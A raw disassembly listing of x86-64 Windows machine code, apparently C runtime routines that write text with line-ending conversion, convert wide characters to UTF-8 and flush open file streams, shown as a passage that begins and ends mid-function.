   140009c04:	7d 2d                	jge    0x140009c33
   140009c06:	48 ff c6             	inc    %rsi
   140009c09:	49 3b f5             	cmp    %r13,%rsi
   140009c0c:	0f 83 b2 01 00 00    	jae    0x140009dc4
   140009c12:	48 8b d7             	mov    %rdi,%rdx
   140009c15:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140009c1b:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140009c20:	e8 67 15 00 00       	call   0x14000b18c
   140009c25:	83 f8 ff             	cmp    $0xffffffff,%eax
   140009c28:	75 22                	jne    0x140009c4c
   140009c2a:	80 7d 8f 00          	cmpb   $0x0,-0x71(%rbp)
   140009c2e:	e9 8b 01 00 00       	jmp    0x140009dbe
   140009c33:	4d 8b c7             	mov    %r15,%r8
   140009c36:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140009c3b:	48 8b d7             	mov    %rdi,%rdx
   140009c3e:	e8 49 15 00 00       	call   0x14000b18c
   140009c43:	83 f8 ff             	cmp    $0xffffffff,%eax
   140009c46:	0f 84 af 01 00 00    	je     0x140009dfb
   140009c4c:	8b 4d a7             	mov    -0x59(%rbp),%ecx
   140009c4f:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   140009c53:	33 db                	xor    %ebx,%ebx
   140009c55:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140009c5a:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140009c5f:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   140009c63:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140009c68:	45 8b cf             	mov    %r15d,%r9d
   140009c6b:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   140009c72:	00 
   140009c73:	33 d2                	xor    %edx,%edx
   140009c75:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009c7a:	e8 05 e0 ff ff       	call   0x140007c84
   140009c7f:	8b f0                	mov    %eax,%esi
   140009c81:	85 c0                	test   %eax,%eax
   140009c83:	0f 84 d2 01 00 00    	je     0x140009e5b
   140009c89:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   140009c8d:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   140009c92:	44 8b c0             	mov    %eax,%r8d
   140009c95:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009c9a:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   140009c9e:	ff 15 c4 bc 00 00    	call   *0xbcc4(%rip)        # 0x140015968
   140009ca4:	45 33 db             	xor    %r11d,%r11d
   140009ca7:	85 c0                	test   %eax,%eax
   140009ca9:	0f 84 a3 01 00 00    	je     0x140009e52
   140009caf:	44 8b 7c 24 40       	mov    0x40(%rsp),%r15d
   140009cb4:	8b df                	mov    %edi,%ebx
   140009cb6:	2b 5d df             	sub    -0x21(%rbp),%ebx
   140009cb9:	41 03 df             	add    %r15d,%ebx
   140009cbc:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   140009cbf:	39 74 24 4c          	cmp    %esi,0x4c(%rsp)
   140009cc3:	0f 82 f1 00 00 00    	jb     0x140009dba
   140009cc9:	80 7c 24 44 0a       	cmpb   $0xa,0x44(%rsp)
   140009cce:	75 49                	jne    0x140009d19
   140009cd0:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   140009cd4:	41 8d 43 0d          	lea    0xd(%r11),%eax
   140009cd8:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   140009cdd:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   140009ce2:	45 8d 43 01          	lea    0x1(%r11),%r8d
   140009ce6:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140009ceb:	48 8d 54 24 44       	lea    0x44(%rsp),%rdx
   140009cf0:	ff 15 72 bc 00 00    	call   *0xbc72(%rip)        # 0x140015968
   140009cf6:	45 33 db             	xor    %r11d,%r11d
   140009cf9:	85 c0                	test   %eax,%eax
   140009cfb:	0f 84 f1 00 00 00    	je     0x140009df2
   140009d01:	83 7c 24 4c 01       	cmpl   $0x1,0x4c(%rsp)
   140009d06:	0f 82 ae 00 00 00    	jb     0x140009dba
   140009d0c:	41 ff c7             	inc    %r15d
   140009d0f:	ff c3                	inc    %ebx
   140009d11:	44 89 7c 24 40       	mov    %r15d,0x40(%rsp)
   140009d16:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   140009d19:	48 8b f7             	mov    %rdi,%rsi
   140009d1c:	49 3b fd             	cmp    %r13,%rdi
   140009d1f:	0f 83 e0 00 00 00    	jae    0x140009e05
   140009d25:	48 8b 45 e7          	mov    -0x19(%rbp),%rax
   140009d29:	8b 55 ab             	mov    -0x55(%rbp),%edx
   140009d2c:	e9 04 fd ff ff       	jmp    0x140009a35
   140009d31:	41 8b d3             	mov    %r11d,%edx
   140009d34:	4d 85 c0             	test   %r8,%r8
   140009d37:	7e 2d                	jle    0x140009d66
   140009d39:	48 2b fe             	sub    %rsi,%rdi
   140009d3c:	48 8d 1d bd 62 ff ff 	lea    -0x9d43(%rip),%rbx        # 0x140000000
   140009d43:	8a 04 37             	mov    (%rdi,%rsi,1),%al
   140009d46:	ff c2                	inc    %edx
   140009d48:	4a 8b 8c e3 f0 86 01 	mov    0x186f0(%rbx,%r12,8),%rcx
   140009d4f:	00 
   140009d50:	48 03 ce             	add    %rsi,%rcx
   140009d53:	48 ff c6             	inc    %rsi
   140009d56:	42 88 44 f1 3e       	mov    %al,0x3e(%rcx,%r14,8)
   140009d5b:	48 63 c2             	movslq %edx,%rax
   140009d5e:	49 3b c0             	cmp    %r8,%rax
   140009d61:	7c e0                	jl     0x140009d43
   140009d63:	8b 5d 9b             	mov    -0x65(%rbp),%ebx
   140009d66:	41 03 d8             	add    %r8d,%ebx
   140009d69:	eb 4c                	jmp    0x140009db7
   140009d6b:	45 8b cb             	mov    %r11d,%r9d
   140009d6e:	48 85 d2             	test   %rdx,%rdx
   140009d71:	7e 42                	jle    0x140009db5
   140009d73:	4c 8b 6d ef          	mov    -0x11(%rbp),%r13
   140009d77:	4d 8b c3             	mov    %r11,%r8
   140009d7a:	4d 8b d5             	mov    %r13,%r10
   140009d7d:	41 83 e5 3f          	and    $0x3f,%r13d
   140009d81:	49 c1 fa 06          	sar    $0x6,%r10
   140009d85:	4e 8d 1c ed 00 00 00 	lea    0x0(,%r13,8),%r11
   140009d8c:	00 
   140009d8d:	4d 03 dd             	add    %r13,%r11
   140009d90:	41 8a 04 38          	mov    (%r8,%rdi,1),%al
   140009d94:	41 ff c1             	inc    %r9d
   140009d97:	4b 8b 8c d7 f0 86 01 	mov    0x186f0(%r15,%r10,8),%rcx
   140009d9e:	00 
   140009d9f:	49 03 c8             	add    %r8,%rcx
   140009da2:	49 ff c0             	inc    %r8
   140009da5:	42 88 44 d9 3e       	mov    %al,0x3e(%rcx,%r11,8)
   140009daa:	49 63 c1             	movslq %r9d,%rax
   140009dad:	48 3b c2             	cmp    %rdx,%rax
   140009db0:	7c de                	jl     0x140009d90
   140009db2:	45 33 db             	xor    %r11d,%r11d
   140009db5:	03 da                	add    %edx,%ebx
   140009db7:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   140009dba:	44 38 5d 8f          	cmp    %r11b,-0x71(%rbp)
   140009dbe:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   140009dc2:	eb 49                	jmp    0x140009e0d
   140009dc4:	8a 07                	mov    (%rdi),%al
   140009dc6:	4c 8d 05 33 62 ff ff 	lea    -0x9dcd(%rip),%r8        # 0x140000000
   140009dcd:	4b 8b 8c e0 f0 86 01 	mov    0x186f0(%r8,%r12,8),%rcx
   140009dd4:	00 
   140009dd5:	ff c3                	inc    %ebx
   140009dd7:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   140009dda:	42 88 44 f1 3e       	mov    %al,0x3e(%rcx,%r14,8)
   140009ddf:	4b 8b 84 e0 f0 86 01 	mov    0x186f0(%r8,%r12,8),%rax
   140009de6:	00 
   140009de7:	42 80 4c f0 3d 04    	orb    $0x4,0x3d(%rax,%r14,8)
   140009ded:	38 55 8f             	cmp    %dl,-0x71(%rbp)
   140009df0:	eb cc                	jmp    0x140009dbe
   140009df2:	ff 15 10 ba 00 00    	call   *0xba10(%rip)        # 0x140015808
   140009df8:	89 45 97             	mov    %eax,-0x69(%rbp)
   140009dfb:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   140009dff:	80 7d 8f 00          	cmpb   $0x0,-0x71(%rbp)
   140009e03:	eb 08                	jmp    0x140009e0d
   140009e05:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   140009e09:	44 38 5d 8f          	cmp    %r11b,-0x71(%rbp)
   140009e0d:	74 0c                	je     0x140009e1b
   140009e0f:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140009e14:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140009e1b:	48 8b 45 f7          	mov    -0x9(%rbp),%rax
   140009e1f:	f2 0f 10 45 97       	movsd  -0x69(%rbp),%xmm0
   140009e24:	f2 0f 11 00          	movsd  %xmm0,(%rax)
   140009e28:	89 48 08             	mov    %ecx,0x8(%rax)
   140009e2b:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   140009e2f:	48 33 cc             	xor    %rsp,%rcx
   140009e32:	e8 e9 74 ff ff       	call   0x140001320
   140009e37:	48 8b 9c 24 40 01 00 	mov    0x140(%rsp),%rbx
   140009e3e:	00 
   140009e3f:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
   140009e46:	41 5f                	pop    %r15
   140009e48:	41 5e                	pop    %r14
   140009e4a:	41 5d                	pop    %r13
   140009e4c:	41 5c                	pop    %r12
   140009e4e:	5f                   	pop    %rdi
   140009e4f:	5e                   	pop    %rsi
   140009e50:	5d                   	pop    %rbp
   140009e51:	c3                   	ret
   140009e52:	ff 15 b0 b9 00 00    	call   *0xb9b0(%rip)        # 0x140015808
   140009e58:	89 45 97             	mov    %eax,-0x69(%rbp)
   140009e5b:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   140009e5f:	38 5d 8f             	cmp    %bl,-0x71(%rbp)
   140009e62:	eb a9                	jmp    0x140009e0d
   140009e64:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009e69:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140009e6e:	56                   	push   %rsi
   140009e6f:	57                   	push   %rdi
   140009e70:	41 56                	push   %r14
   140009e72:	b8 50 14 00 00       	mov    $0x1450,%eax
   140009e77:	e8 04 05 00 00       	call   0x14000a380
   140009e7c:	48 2b e0             	sub    %rax,%rsp
   140009e7f:	48 8b 05 b2 d1 00 00 	mov    0xd1b2(%rip),%rax        # 0x140017038
   140009e86:	48 33 c4             	xor    %rsp,%rax
   140009e89:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   140009e90:	00 
   140009e91:	4c 63 d2             	movslq %edx,%r10
   140009e94:	48 8b f9             	mov    %rcx,%rdi
   140009e97:	49 8b c2             	mov    %r10,%rax
   140009e9a:	41 8b e9             	mov    %r9d,%ebp
   140009e9d:	48 c1 f8 06          	sar    $0x6,%rax
   140009ea1:	48 8d 0d 48 e8 00 00 	lea    0xe848(%rip),%rcx        # 0x1400186f0
   140009ea8:	41 83 e2 3f          	and    $0x3f,%r10d
   140009eac:	49 03 e8             	add    %r8,%rbp
   140009eaf:	49 8b f0             	mov    %r8,%rsi
   140009eb2:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   140009eb6:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   140009eba:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   140009ebf:	33 c0                	xor    %eax,%eax
   140009ec1:	48 89 07             	mov    %rax,(%rdi)
   140009ec4:	89 47 08             	mov    %eax,0x8(%rdi)
   140009ec7:	4c 3b c5             	cmp    %rbp,%r8
   140009eca:	73 6f                	jae    0x140009f3b
   140009ecc:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   140009ed1:	48 3b f5             	cmp    %rbp,%rsi
   140009ed4:	73 24                	jae    0x140009efa
   140009ed6:	8a 06                	mov    (%rsi),%al
   140009ed8:	48 ff c6             	inc    %rsi
   140009edb:	3c 0a                	cmp    $0xa,%al
   140009edd:	75 09                	jne    0x140009ee8
   140009edf:	ff 47 08             	incl   0x8(%rdi)
   140009ee2:	c6 03 0d             	movb   $0xd,(%rbx)
   140009ee5:	48 ff c3             	inc    %rbx
   140009ee8:	88 03                	mov    %al,(%rbx)
   140009eea:	48 ff c3             	inc    %rbx
   140009eed:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   140009ef4:	00 
   140009ef5:	48 3b d8             	cmp    %rax,%rbx
   140009ef8:	72 d7                	jb     0x140009ed1
   140009efa:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009f00:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140009f05:	2b d8                	sub    %eax,%ebx
   140009f07:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140009f0c:	44 8b c3             	mov    %ebx,%r8d
   140009f0f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140009f14:	49 8b ce             	mov    %r14,%rcx
   140009f17:	ff 15 4b ba 00 00    	call   *0xba4b(%rip)        # 0x140015968
   140009f1d:	85 c0                	test   %eax,%eax
   140009f1f:	74 12                	je     0x140009f33
   140009f21:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140009f25:	01 47 04             	add    %eax,0x4(%rdi)
   140009f28:	3b c3                	cmp    %ebx,%eax
   140009f2a:	72 0f                	jb     0x140009f3b
   140009f2c:	48 3b f5             	cmp    %rbp,%rsi
   140009f2f:	72 9b                	jb     0x140009ecc
   140009f31:	eb 08                	jmp    0x140009f3b
   140009f33:	ff 15 cf b8 00 00    	call   *0xb8cf(%rip)        # 0x140015808
   140009f39:	89 07                	mov    %eax,(%rdi)
   140009f3b:	48 8b c7             	mov    %rdi,%rax
   140009f3e:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   140009f45:	00 
   140009f46:	48 33 cc             	xor    %rsp,%rcx
   140009f49:	e8 d2 73 ff ff       	call   0x140001320
   140009f4e:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   140009f55:	00 
   140009f56:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140009f5a:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140009f5e:	49 8b e3             	mov    %r11,%rsp
   140009f61:	41 5e                	pop    %r14
   140009f63:	5f                   	pop    %rdi
   140009f64:	5e                   	pop    %rsi
   140009f65:	c3                   	ret
   140009f66:	cc                   	int3
   140009f67:	cc                   	int3
   140009f68:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009f6d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140009f72:	56                   	push   %rsi
   140009f73:	57                   	push   %rdi
   140009f74:	41 56                	push   %r14
   140009f76:	b8 50 14 00 00       	mov    $0x1450,%eax
   140009f7b:	e8 00 04 00 00       	call   0x14000a380
   140009f80:	48 2b e0             	sub    %rax,%rsp
   140009f83:	48 8b 05 ae d0 00 00 	mov    0xd0ae(%rip),%rax        # 0x140017038
   140009f8a:	48 33 c4             	xor    %rsp,%rax
   140009f8d:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   140009f94:	00 
   140009f95:	4c 63 d2             	movslq %edx,%r10
   140009f98:	48 8b f9             	mov    %rcx,%rdi
   140009f9b:	49 8b c2             	mov    %r10,%rax
   140009f9e:	41 8b e9             	mov    %r9d,%ebp
   140009fa1:	48 c1 f8 06          	sar    $0x6,%rax
   140009fa5:	48 8d 0d 44 e7 00 00 	lea    0xe744(%rip),%rcx        # 0x1400186f0
   140009fac:	41 83 e2 3f          	and    $0x3f,%r10d
   140009fb0:	49 03 e8             	add    %r8,%rbp
   140009fb3:	49 8b f0             	mov    %r8,%rsi
   140009fb6:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   140009fba:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   140009fbe:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   140009fc3:	33 c0                	xor    %eax,%eax
   140009fc5:	48 89 07             	mov    %rax,(%rdi)
   140009fc8:	89 47 08             	mov    %eax,0x8(%rdi)
   140009fcb:	4c 3b c5             	cmp    %rbp,%r8
   140009fce:	0f 83 82 00 00 00    	jae    0x14000a056
   140009fd4:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   140009fd9:	48 3b f5             	cmp    %rbp,%rsi
   140009fdc:	73 31                	jae    0x14000a00f
   140009fde:	0f b7 06             	movzwl (%rsi),%eax
   140009fe1:	48 83 c6 02          	add    $0x2,%rsi
   140009fe5:	66 83 f8 0a          	cmp    $0xa,%ax
   140009fe9:	75 10                	jne    0x140009ffb
   140009feb:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   140009fef:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140009ff4:	66 89 0b             	mov    %cx,(%rbx)
   140009ff7:	48 83 c3 02          	add    $0x2,%rbx
   140009ffb:	66 89 03             	mov    %ax,(%rbx)
   140009ffe:	48 83 c3 02          	add    $0x2,%rbx
   14000a002:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   14000a009:	00 
   14000a00a:	48 3b d8             	cmp    %rax,%rbx
   14000a00d:	72 ca                	jb     0x140009fd9
   14000a00f:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a015:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000a01a:	48 2b d8             	sub    %rax,%rbx
   14000a01d:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000a022:	48 d1 fb             	sar    $1,%rbx
   14000a025:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000a02a:	03 db                	add    %ebx,%ebx
   14000a02c:	49 8b ce             	mov    %r14,%rcx
   14000a02f:	44 8b c3             	mov    %ebx,%r8d
   14000a032:	ff 15 30 b9 00 00    	call   *0xb930(%rip)        # 0x140015968
   14000a038:	85 c0                	test   %eax,%eax
   14000a03a:	74 12                	je     0x14000a04e
   14000a03c:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000a040:	01 47 04             	add    %eax,0x4(%rdi)
   14000a043:	3b c3                	cmp    %ebx,%eax
   14000a045:	72 0f                	jb     0x14000a056
   14000a047:	48 3b f5             	cmp    %rbp,%rsi
   14000a04a:	72 88                	jb     0x140009fd4
   14000a04c:	eb 08                	jmp    0x14000a056
   14000a04e:	ff 15 b4 b7 00 00    	call   *0xb7b4(%rip)        # 0x140015808
   14000a054:	89 07                	mov    %eax,(%rdi)
   14000a056:	48 8b c7             	mov    %rdi,%rax
   14000a059:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000a060:	00 
   14000a061:	48 33 cc             	xor    %rsp,%rcx
   14000a064:	e8 b7 72 ff ff       	call   0x140001320
   14000a069:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000a070:	00 
   14000a071:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000a075:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000a079:	49 8b e3             	mov    %r11,%rsp
   14000a07c:	41 5e                	pop    %r14
   14000a07e:	5f                   	pop    %rdi
   14000a07f:	5e                   	pop    %rsi
   14000a080:	c3                   	ret
   14000a081:	cc                   	int3
   14000a082:	cc                   	int3
   14000a083:	cc                   	int3
   14000a084:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a089:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000a08e:	56                   	push   %rsi
   14000a08f:	57                   	push   %rdi
   14000a090:	41 54                	push   %r12
   14000a092:	41 56                	push   %r14
   14000a094:	41 57                	push   %r15
   14000a096:	b8 70 14 00 00       	mov    $0x1470,%eax
   14000a09b:	e8 e0 02 00 00       	call   0x14000a380
   14000a0a0:	48 2b e0             	sub    %rax,%rsp
   14000a0a3:	48 8b 05 8e cf 00 00 	mov    0xcf8e(%rip),%rax        # 0x140017038
   14000a0aa:	48 33 c4             	xor    %rsp,%rax
   14000a0ad:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   14000a0b4:	00 
   14000a0b5:	4c 63 d2             	movslq %edx,%r10
   14000a0b8:	48 8b d9             	mov    %rcx,%rbx
   14000a0bb:	49 8b c2             	mov    %r10,%rax
   14000a0be:	45 8b f1             	mov    %r9d,%r14d
   14000a0c1:	48 c1 f8 06          	sar    $0x6,%rax
   14000a0c5:	48 8d 0d 24 e6 00 00 	lea    0xe624(%rip),%rcx        # 0x1400186f0
   14000a0cc:	41 83 e2 3f          	and    $0x3f,%r10d
   14000a0d0:	4d 03 f0             	add    %r8,%r14
   14000a0d3:	4d 8b f8             	mov    %r8,%r15
   14000a0d6:	49 8b f8             	mov    %r8,%rdi
   14000a0d9:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000a0dd:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000a0e1:	4c 8b 64 d0 28       	mov    0x28(%rax,%rdx,8),%r12
   14000a0e6:	33 c0                	xor    %eax,%eax
   14000a0e8:	48 89 03             	mov    %rax,(%rbx)
   14000a0eb:	4d 3b c6             	cmp    %r14,%r8
   14000a0ee:	89 43 08             	mov    %eax,0x8(%rbx)
   14000a0f1:	0f 83 ce 00 00 00    	jae    0x14000a1c5
   14000a0f7:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000a0fc:	49 3b fe             	cmp    %r14,%rdi
   14000a0ff:	73 2d                	jae    0x14000a12e
   14000a101:	0f b7 0f             	movzwl (%rdi),%ecx
   14000a104:	48 83 c7 02          	add    $0x2,%rdi
   14000a108:	66 83 f9 0a          	cmp    $0xa,%cx
   14000a10c:	75 0c                	jne    0x14000a11a
   14000a10e:	ba 0d 00 00 00       	mov    $0xd,%edx
   14000a113:	66 89 10             	mov    %dx,(%rax)
   14000a116:	48 83 c0 02          	add    $0x2,%rax
   14000a11a:	66 89 08             	mov    %cx,(%rax)
   14000a11d:	48 83 c0 02          	add    $0x2,%rax
   14000a121:	48 8d 8c 24 f8 06 00 	lea    0x6f8(%rsp),%rcx
   14000a128:	00 
   14000a129:	48 3b c1             	cmp    %rcx,%rax
   14000a12c:	72 ce                	jb     0x14000a0fc
   14000a12e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000a134:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000a139:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000a13f:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000a144:	48 2b c1             	sub    %rcx,%rax
   14000a147:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   14000a14e:	00 
   14000a14f:	48 8d 8c 24 00 07 00 	lea    0x700(%rsp),%rcx
   14000a156:	00 
   14000a157:	48 d1 f8             	sar    $1,%rax
   14000a15a:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000a15f:	44 8b c8             	mov    %eax,%r9d
   14000a162:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000a167:	33 d2                	xor    %edx,%edx
   14000a169:	e8 16 db ff ff       	call   0x140007c84
   14000a16e:	8b e8                	mov    %eax,%ebp
   14000a170:	85 c0                	test   %eax,%eax
   14000a172:	74 49                	je     0x14000a1bd
   14000a174:	33 f6                	xor    %esi,%esi
   14000a176:	85 c0                	test   %eax,%eax
   14000a178:	74 33                	je     0x14000a1ad
   14000a17a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a180:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   14000a187:	00 
   14000a188:	8b ce                	mov    %esi,%ecx
   14000a18a:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000a18f:	44 8b c5             	mov    %ebp,%r8d
   14000a192:	48 03 d1             	add    %rcx,%rdx
   14000a195:	49 8b cc             	mov    %r12,%rcx
   14000a198:	44 2b c6             	sub    %esi,%r8d
   14000a19b:	ff 15 c7 b7 00 00    	call   *0xb7c7(%rip)        # 0x140015968
   14000a1a1:	85 c0                	test   %eax,%eax
   14000a1a3:	74 18                	je     0x14000a1bd
   14000a1a5:	03 74 24 40          	add    0x40(%rsp),%esi
   14000a1a9:	3b f5                	cmp    %ebp,%esi
   14000a1ab:	72 cd                	jb     0x14000a17a
   14000a1ad:	8b c7                	mov    %edi,%eax
   14000a1af:	41 2b c7             	sub    %r15d,%eax
   14000a1b2:	89 43 04             	mov    %eax,0x4(%rbx)
   14000a1b5:	49 3b fe             	cmp    %r14,%rdi
   14000a1b8:	e9 34 ff ff ff       	jmp    0x14000a0f1
   14000a1bd:	ff 15 45 b6 00 00    	call   *0xb645(%rip)        # 0x140015808
   14000a1c3:	89 03                	mov    %eax,(%rbx)
   14000a1c5:	48 8b c3             	mov    %rbx,%rax
   14000a1c8:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   14000a1cf:	00 
   14000a1d0:	48 33 cc             	xor    %rsp,%rcx
   14000a1d3:	e8 48 71 ff ff       	call   0x140001320
   14000a1d8:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   14000a1df:	00 
   14000a1e0:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000a1e4:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   14000a1e8:	49 8b e3             	mov    %r11,%rsp
   14000a1eb:	41 5f                	pop    %r15
   14000a1ed:	41 5e                	pop    %r14
   14000a1ef:	41 5c                	pop    %r12
   14000a1f1:	5f                   	pop    %rdi
   14000a1f2:	5e                   	pop    %rsi
   14000a1f3:	c3                   	ret
   14000a1f4:	48 83 ec 28          	sub    $0x28,%rsp
   14000a1f8:	48 85 c9             	test   %rcx,%rcx
   14000a1fb:	75 15                	jne    0x14000a212
   14000a1fd:	e8 fa c0 ff ff       	call   0x1400062fc
   14000a202:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a208:	e8 c3 b6 ff ff       	call   0x1400058d0
   14000a20d:	83 c8 ff             	or     $0xffffffff,%eax
   14000a210:	eb 03                	jmp    0x14000a215
   14000a212:	8b 41 18             	mov    0x18(%rcx),%eax
   14000a215:	48 83 c4 28          	add    $0x28,%rsp
   14000a219:	c3                   	ret
   14000a21a:	cc                   	int3
   14000a21b:	cc                   	int3
   14000a21c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a221:	57                   	push   %rdi
   14000a222:	48 83 ec 30          	sub    $0x30,%rsp
   14000a226:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000a22b:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000a230:	e8 ab a1 ff ff       	call   0x1400043e0
   14000a235:	90                   	nop
   14000a236:	bb 03 00 00 00       	mov    $0x3,%ebx
   14000a23b:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   14000a23f:	3b 1d 0b e9 00 00    	cmp    0xe90b(%rip),%ebx        # 0x140018b50
   14000a245:	74 6d                	je     0x14000a2b4
   14000a247:	48 63 fb             	movslq %ebx,%rdi
   14000a24a:	48 8b 05 07 e9 00 00 	mov    0xe907(%rip),%rax        # 0x140018b58
   14000a251:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000a255:	48 85 c9             	test   %rcx,%rcx
   14000a258:	75 02                	jne    0x14000a25c
   14000a25a:	eb 54                	jmp    0x14000a2b0
   14000a25c:	8b 41 14             	mov    0x14(%rcx),%eax
   14000a25f:	c1 e8 0d             	shr    $0xd,%eax
   14000a262:	a8 01                	test   $0x1,%al
   14000a264:	74 19                	je     0x14000a27f
   14000a266:	48 8b 0d eb e8 00 00 	mov    0xe8eb(%rip),%rcx        # 0x140018b58
   14000a26d:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000a271:	e8 4a 13 00 00       	call   0x14000b5c0
   14000a276:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000a279:	74 04                	je     0x14000a27f
   14000a27b:	ff 44 24 20          	incl   0x20(%rsp)
   14000a27f:	48 8b 05 d2 e8 00 00 	mov    0xe8d2(%rip),%rax        # 0x140018b58
   14000a286:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000a28a:	48 83 c1 30          	add    $0x30,%rcx
   14000a28e:	ff 15 d4 b4 00 00    	call   *0xb4d4(%rip)        # 0x140015768
   14000a294:	48 8b 0d bd e8 00 00 	mov    0xe8bd(%rip),%rcx        # 0x140018b58
   14000a29b:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000a29f:	e8 30 b5 ff ff       	call   0x1400057d4
   14000a2a4:	48 8b 05 ad e8 00 00 	mov    0xe8ad(%rip),%rax        # 0x140018b58
   14000a2ab:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   14000a2b0:	ff c3                	inc    %ebx
   14000a2b2:	eb 87                	jmp    0x14000a23b
   14000a2b4:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000a2b9:	e8 3e a1 ff ff       	call   0x1400043fc
   14000a2be:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000a2c2:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000a2c7:	48 83 c4 30          	add    $0x30,%rsp
   14000a2cb:	5f                   	pop    %rdi
   14000a2cc:	c3                   	ret
   14000a2cd:	cc                   	int3
   14000a2ce:	cc                   	int3
   14000a2cf:	cc                   	int3
   14000a2d0:	40 53                	rex push %rbx
   14000a2d2:	48 83 ec 20          	sub    $0x20,%rsp
